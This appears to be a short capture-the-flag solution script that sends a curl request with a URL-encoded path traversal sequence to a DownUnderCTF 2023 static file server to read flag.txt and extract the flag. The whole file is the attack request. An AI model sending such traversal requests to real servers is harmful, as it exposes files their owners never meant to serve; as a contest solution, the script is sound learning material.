#!/bin/bash

curl -s https://web-static-file-server-9af22c2b5640.2023.ductf.dev/files/..%2F..%2Fflag.txt | grep -oE DUCTF{.*}
